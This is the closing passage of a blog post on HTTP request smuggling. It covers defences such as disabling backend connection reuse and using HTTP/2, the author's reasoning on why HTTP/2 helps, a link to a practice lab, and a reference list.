<p>We&rsquo;ve known the harm of HTTP request smuggling, and we will question: how to prevent it? There are three general defenses (not specific to a particular server).</p>
<p>- Disable TCP connection reuse between the proxy server and the back end server.
- Use the HTTP/2 protocol.
- The front and back ends use the same server.</p>
<p>Some of the above measures can not solve the problem fundamentally, and there are many shortcomings, such as disabling TCP connection reuse between the proxy server and the back-end server, which will increase the pressure on the back-end server. Using HTTP/2 can&rsquo;t be promoted under the current network conditions, even if the server supporting HTTP/2 protocol is compatible with HTTP/1.1. In essence, the reason for HTTP request smuggling is not the problem of protocol design, but the problem of different server implementations. I personally think that the best solution is to strictly implement the standards specified in RFC7230-7235, but this is the most difficult to achieve.</p>
</blockquote>
<p>However, I have read a lot of attack articles which all did not mention why HTTP/2 can prevent HTTP Smuggling. The original author also mentioned in a sentence.</p>
<blockquote>
<p>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</p>
</blockquote>
<p>Then I went to check the differences between HTTP/2 and HTTP/1.1. In my opinion, I think that Request multiplexing over a single TCP connection is mainly added to HTTP/2, which means that using HTTP/2 can use a single TCP connection to request resources. This reduces the possibility of TCP connection reuse, even if you can smuggle, you can only hit yourself and the introduction of a new binary framing mechanism also limits this attack. And more imporantly, <code>Transfer-Encoding: chunk</code> is canceled in HTTP/2. :P</p>
<p>For details, please refer to <a class=link href=https://developers.google.com/web/fundamentals/performance/http2##%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5 target=_blank rel=noopener>the introduction of HTTP / 2</a></p>
<p><figure class=gallery-image style=flex-grow:119;flex-basis:287px>
<a href=/2019/12/08/HTTP-Smuggling-en/20200520132137.png data-size=747x624><img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//2019/12/08/HTTP-Smuggling-en/20200520132137.png width=747 height=624 srcset="/2019/12/08/HTTP-Smuggling-en/20200520132137_hufeaacba2cd839e6dab3a7a2ba7820971_43489_480x0_resize_box_3.png 480w, /2019/12/08/HTTP-Smuggling-en/20200520132137_hufeaacba2cd839e6dab3a7a2ba7820971_43489_1024x0_resize_box_3.png 1024w" loading=lazy>
</a>
</figure></p>
<h2 id=bonus>Bonus</h2>
<p>After this period of study and research, I have also organized some related experiments into a docker environment, which is convenient for everyone to reproduce learning：<a class=link href=https://github.com/ZeddYu/HTTP-Smuggling-Lab target=_blank rel=noopener>HTTP-Smuggling-Lab</a></p>
<p>Now the environment is not much. If you think the lab is useful, plz give me a star. I will continue to add more environments later to facilitate everyone to understand and learn this attack tech. <del>if I have enough time</del></p>
<p>If you think this post helps you, you could buy me a coffee to support my writing.</p>
<p><a href=https://www.buymeacoffee.com/Zedd target=_blank><img src=https://cdn.buymeacoffee.com/buttons/v2/default-blue.png alt="Buy Me A Coffee" style=height:60px!important;width:217px!important></a></p>
<h2 id=references>References</h2>
<p><a class=link href=https://tools.ietf.org/html/rfc7230 target=_blank rel=noopener>RFC7230</a></p>
<p><a class=link href=https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn target=_blank rel=noopener>HTTP Desync Attacks: Request Smuggling Reborn</a></p>
<p><a class=link href=https://portswigger.net/web-security/request-smuggling target=_blank rel=noopener>HTTP request smuggling</a></p>
<p><a class=link href=https://regilero.github.io/tag/Smuggling/ target=_blank rel=noopener>regilero&rsquo;s blog</a></p>
<p><a class=link href=https://paper.seebug.org/1049/ target=_blank rel=noopener>Protocol Layer Attack - HTTP Request Smuggling</a></p>
<p><a class=link href=https://github.com/netty/netty/issues/9571 target=_blank rel=noopener>http request smuggling, cause by obfuscating TE header</a></p>
<p><a class=link href=https://hackerone.com/reports/648434 target=_blank rel=noopener>Multiple HTTP Smuggling reports</a></p>
<p><a class=link href=https://medium.com/@factoryhr/http-2-the-difference-between-http-1-1-benefits-and-how-to-use-it-38094fa0e95b target=_blank rel=noopener>HTTP/2: the difference between HTTP/1.1, benefits and how to use it</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/Sec/>Sec</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2021/04/20/tls-poison/>
<div class=article-details>
<h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2>
</div>
</a>
</article>
<article>
<a href=/2019/12/05/HTTP-Smuggling/>
<div class=article-details>
<h2 class=article-title>一篇文章带你读懂 HTTP Smuggling 攻击</h2>
</div>
</a>
</article>
<article>
<a href=/2019/06/12/Scanner/>
<div class=article-details>
<h2 class=article-title>浅谈端口扫描技术</h2>
</div>
</a>
</article>
<article>
<a href=/2019/06/07/LFI2RCE/>
<div class=article-details>
<h2 class=article-title>LFI2RCE</h2>
</div>
</a>
</article>
<article>
<a href=/2019/04/11/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/>
<div class=article-details>
<h2 class=article-title>从一道题讲PHP复杂变量</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2022 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#tlnr>TL;NR</a></li>
<li><a href=#timeline>TimeLine</a></li>
<li><a href=#causes>Causes</a>
<ol>
<li><a href=#http-connection-mod>HTTP Connection Mod</a>
<ol>
<li><a href=#keep-alive>Keep-Alive</a></li>
<li><a href=#pipline>Pipline</a></li>
</ol>
</li>
<li><a href=#message-body>Message Body</a>
<ol>
<li><a href=#transfer-encoding>Transfer-Encoding</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#background>Background</a></li>
<li><a href=#attack-method>Attack Method</a>
<ol>
<li><a href=#chunks-priority-on-content-length>Chunks Priority On Content-Length</a></li>
<li><a href=#bad-chunked-transmission>Bad Chunked Transmission</a></li>
<li><a href=#null-in-headers>Null In Headers</a></li>
<li><a href=#crlf>CRLF</a></li>
<li><a href=#size-issue>Size Issue</a></li>
<li><a href=#http-version>HTTP Version</a></li>
<li><a href=#has-a-cl-in-get>Has a CL in GET</a></li>
<li><a href=#two-identical-fields---cl>Two Identical Fields - CL</a></li>
<li><a href=#optional-whitespace>Optional WhiteSpace</a></li>
<li><a href=#cl-te>CL-TE</a></li>
<li><a href=#te-cl>TE-CL</a></li>
<li><a href=#two-identical-fields---te>Two Identical Fields - TE</a></li>
</ol>
</li>
<li><a href=#attack-surface>Attack Surface</a>
<ol>
<li><a href=#bypass-front-end-security-controls>Bypass Front-end Security Controls</a></li>
<li><a href=#revealing-front-end-request-rewriting>Revealing Front-end Request Rewriting</a></li>
<li><a href=#capturing-other-users-requests>Capturing other users' requests</a></li>
<li><a href=#exploit-reflected-xss>Exploit Reflected XSS</a></li>
<li><a href=#turn-an-on-site-redirect-into-an-open-redirect>Turn An On-Site Redirect Into An Open Redirect</a></li>
<li><a href=#perform-web-cache-poisoning>Perform Web Cache Poisoning</a></li>
<li><a href=#perform-web-cache-deception>Perform Web Cache Deception</a></li>
</ol>
</li>
<li><a href=#real-world>Real World</a>
<ol>
<li><a href=#paypal>Paypal</a></li>
<li><a href=#ats>ATS</a>
<ol>
<li><a href=#request-splitting-using-huge-header>Request Splitting using Huge Header</a></li>
</ol>
</li>
<li><a href=#jetty>Jetty</a>
<ol>
<li><a href=#http09>HTTP/0.9</a></li>
<li><a href=#chunk-size-attribute-truncation>Chunk size attribute truncation</a></li>
</ol>
</li>
<li><a href=#websocket>Websocket</a></li>
<li><a href=#golang>Golang</a></li>
<li><a href=#something-else>Something Else</a></li>
</ol>
</li>
<li><a href=#defence>Defence</a></li>
<li><a href=#bonus>Bonus</a></li>
<li><a href=#references>References</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>'serviceWorker'in navigator&&window.addEventListener('load',function(){navigator.serviceWorker.register('/sw.js')})</script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>